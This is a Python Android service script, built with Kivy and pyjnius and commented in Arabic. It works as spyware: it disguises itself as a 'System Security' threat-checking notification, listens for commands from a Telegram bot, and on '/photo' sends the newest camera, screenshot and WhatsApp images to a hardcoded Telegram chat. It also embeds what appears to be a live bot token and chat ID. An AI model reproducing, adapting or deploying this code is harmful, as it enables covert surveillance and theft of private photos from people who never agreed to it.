import os
import time
import requests
import threading
from jnius import autoclass

# إعدادات التحكم (بياناتك الخاصة)
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
CHAT_ID = "7084557369"

# أدوات النظام للأندرويد لإنشاء الإشعار (Foreground)
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
BuildVersion = autoclass('android.os.Build$VERSION')

class ShadowService:
    def __init__(self):
        self.service = PythonService.mService
        self.context = self.service.getApplicationContext()

    def create_notification_channel(self):
        # إنشاء قناة إشعار لضمان استقرار الخدمة في أندرويد 8 فما فوق
        if BuildVersion.SDK_INT >= 26:
            channel_id = "system_update_channel"
            name = "System Update Service"
            importance = NotificationManager.IMPORTANCE_LOW
            channel = NotificationChannel(channel_id, name, importance)
            nm = self.context.getSystemService(Context.NOTIFICATION_SERVICE)
            nm.createNotificationChannel(channel)
            return channel_id
        return "default"

    def start_foreground(self):
        try:
            channel_id = self.create_notification_channel()
            builder = NotificationBuilder(self.context, channel_id)
            builder.setContentTitle("System Security")
            builder.setContentText("Checking for threats...")
            # استخدام أيقونة النظام الافتراضية للتمويه
            builder.setSmallIcon(self.context.getApplicationInfo().icon)
            notification = builder.build()
            self.service.startForeground(1, notification)
        except:
            pass

    def bot_listener(self):
        last_id = 0
        while True:
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id+1}"
                r = requests.get(url, timeout=20, verify=False).json()
                for up in r.get("result", []):
                    last_id = up["update_id"]
                    msg = up.get("message", {}).get("text", "")
                    if msg == "/photo":
                        self.crawl_and_send()
                time.sleep(5)
            except:
                time.sleep(10)

    def crawl_and_send(self):
        # مسارات الزحف الشامل (كاميرا، سكرين شوت، واتساب)
        paths = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures/Screenshots",
            "/sdcard/WhatsApp/Media/WhatsApp Images",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"
        ]
        
        found_pics = []
        for p in paths:
            if os.path.exists(p):
                # البحث عن الصور فقط
                files = [os.path.join(p, f) for f in os.listdir(p) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
                found_pics.extend(files)
        
        # ترتيب حسب الأحدث وإرسال أول 15 صورة
        found_pics.sort(key=os.path.getmtime, reverse=True)
        
        for pic in found_pics[:15]:
            try:
                with open(pic, 'rb') as f:
                    # الإرسال كصورة (Photo) للمعاينة الفورية
                    requests.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                        data={"chat_id": CHAT_ID},
                        files={"photo": f},
                        timeout=30,
                        verify=False
                    )
                time.sleep(1.5) # فاصل زمني بسيط لتجنب الحظر
            except:
                pass

if __name__ == '__main__':
    shadow = ShadowService()
    shadow.start_foreground() # تفعيل الخدمة الأمامية لضمان الاستقرار
    threading.Thread(target=shadow.bot_listener, daemon=True).start()
    
    # إبقاء الخدمة حية في ذاكرة النظام
    while True:
        time.sleep(60)
